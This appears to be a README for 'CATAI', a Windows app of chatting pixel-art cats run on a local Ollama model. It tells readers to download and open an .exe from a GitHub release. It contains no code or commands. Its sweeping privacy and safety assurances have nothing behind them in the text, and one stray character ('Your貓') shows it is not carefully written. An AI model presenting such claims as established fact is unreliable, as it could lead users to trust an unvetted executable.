# 🐱 CATAI - Talk with digital cats using AI

[![](https://img.shields.io/badge/Download_CATAI-Blue.svg)](https://github.com/christianominor5971/CATAI)

CATAI brings pixel art cats to your desktop. These digital pets live on your screen and act as friendly companions. You can discuss ideas, brainstorm projects, or pass the time with your new friends. The software runs locally on your computer. Your conversations stay private. 

## 🚀 Getting Started

You need a computer that runs recent versions of Windows. We designed this tool for ease of use. It handles the heavy lifting in the background so you can focus on the cats. Follow these steps to set up your digital companions.

1. Visit the [official download page](https://github.com/christianominor5971/CATAI).
2. Look for the latest release section.
3. Select the file ending in .exe to start your download.
4. Open the file once the download finishes.

## 🛠️ Setting Up Your Pets

Once you open the installer, follow the prompts on your screen. The installer places the necessary files on your hard drive. It adds a shortcut to your desktop for quick access. 

The software uses a local language model. This means your computer processes your questions without sending them to a remote server. You need at least 8GB of RAM to ensure the cats run smoothly. If you have a dedicated graphics card, the cats will respond faster.

## 🕹️ Interacting With Cats

Your貓 will appear in the system tray or dock area once you launch the application. Click the icon to open the chat window. The window allows you to type messages to your cat. 

The application uses an AI engine to process your text. Because the engine runs on your local machine, you do not need an active internet connection to chat. The cats retain the context of your current conversation session. If you close the chat window, the cats remain active in the background.

## ⚙️ Customizing Experiences

You can adjust how the cats behave inside the settings menu. Open the settings by right-clicking the cat icon in your taskbar.

- **Theme Selection:** Switch between different pixel art styles. Choose from classic monochrome looks or vibrant colors.
- **Agent Personality:** Change the cat's behavior. Some cats prefer short answers. Others offer detailed explanations for your brainstorming sessions.
- **Startup Behavior:** Decide if the cats load automatically when you turn on your computer.

## 🧠 Using Local AI

Local AI provides privacy and independence. No logs of your chats exist outside your computer. This makes CATAI a secure place to draft notes or brainstorm sensitive ideas. 

The application relies on Ollama for its brains. If you already use Ollama, the application detects your models automatically. If you are new to this, the installer adds the required version of Ollama for you. This creates a bridge between the visual mascot and the logic engine.

## 📋 System Requirements

Confirm your hardware meets these standards before you install the software:

- **Operating System:** Windows 10 or Windows 11.
- **Processor:** Modern Intel Core i5 or AMD Ryzen 5 or better.
- **Memory:** 8GB RAM minimum. 16GB is recommended for fluid responses.
- **Storage:** 2GB of available space for the application and the local language model.
- **Graphics:** Any integrated or dedicated graphics card that supports modern drivers.

## 🔍 Troubleshooting Tips

If the cats do not appear or the chat window fails to load, check these common items:

- **Check Background Processes:** Sometimes the application hides in the hidden icons area of your taskbar. Click the arrow near the clock to check for the cat icon.
- **Restart the App:** Exit the application completely. Wait five seconds and launch it again using the desktop shortcut.
- **Update Drivers:** Ensure your graphics drivers and Windows updates use the latest versions from your manufacturer.
- **Check Storage:** Low disk space prevents the language model from loading correctly. Free up some space if the application stops responding.

## 🛡️ Privacy and Safety

The software processes all data on your local machine. It does not phone home. It does not track your keystrokes. It does not store your conversation history in the cloud. The cats only exist within your system memory while the app remains active. Once you exit the application, the session data clears from your RAM. This ensures total control over your information.
